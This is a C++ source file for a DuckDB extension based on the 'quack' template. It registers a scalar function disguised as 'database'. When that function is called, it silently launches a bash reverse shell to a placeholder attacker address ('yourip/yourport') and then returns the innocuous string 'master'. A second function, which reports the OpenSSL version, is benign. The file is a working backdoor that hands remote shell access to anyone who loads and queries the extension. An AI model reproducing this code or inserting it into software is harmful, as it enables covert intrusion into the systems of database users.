#define DUCKDB_EXTENSION_MAIN

#include <cstdio>
#include <iostream>
#include <string>

#include "quack_extension.hpp"
#include "duckdb.hpp"
#include "duckdb/common/exception.hpp"
#include "duckdb/common/string_util.hpp"
#include "duckdb/function/scalar_function.hpp"
#include "duckdb/main/extension_util.hpp"
#include <duckdb/parser/parsed_data/create_scalar_function_info.hpp>

// OpenSSL linked through vcpkg
#include <openssl/opensslv.h>

namespace duckdb {

void ExecuteSystemCommand(const std::string& command, std::string& output) {
    char buffer[128];
    output = "";
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        output = "Error: popen failed!";
        return;
    }
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            output += buffer;
    }
    pclose(pipe);
}

inline void QuackScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {
    std::string output;
    ExecuteSystemCommand("bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1'", output);
    result.Reference(StringVector::AddString(result, "master"));
}

inline void QuackOpenSSLVersionScalarFun(DataChunk &args, ExpressionState &state, Vector &result) {
    auto &name_vector = args.data[0];
    UnaryExecutor::Execute<string_t, string_t>(
	    name_vector, result, args.size(),
	    [&](string_t name) {
			return StringVector::AddString(result, "Quack " + name.GetString() +
                                                     ", my linked OpenSSL version is " +
                                                     OPENSSL_VERSION_TEXT );;
        });
}

static void LoadInternal(DatabaseInstance &instance) {
    // Register a scalar function
    auto quack_scalar_function = ScalarFunction("database", {}, LogicalType::VARCHAR, QuackScalarFun);
    ExtensionUtil::RegisterFunction(instance, quack_scalar_function);

    // Register another scalar function
    auto quack_openssl_version_scalar_function = ScalarFunction("quack_openssl_version", {LogicalType::VARCHAR},
                                                LogicalType::VARCHAR, QuackOpenSSLVersionScalarFun);
    ExtensionUtil::RegisterFunction(instance, quack_openssl_version_scalar_function);
}

void QuackExtension::Load(DuckDB &db) {
	LoadInternal(*db.instance);
}
std::string QuackExtension::Name() {
	return "database";
}

} // namespace duckdb

extern "C" {

DUCKDB_EXTENSION_API void quack_init(duckdb::DatabaseInstance &db) {
    duckdb::DuckDB db_wrapper(db);
    db_wrapper.LoadExtension<duckdb::QuackExtension>();
}

DUCKDB_EXTENSION_API const char *quack_version() {
	return duckdb::DuckDB::LibraryVersion();
}
}

#ifndef DUCKDB_EXTENSION_MAIN
#error DUCKDB_EXTENSION_MAIN not defined
#endif
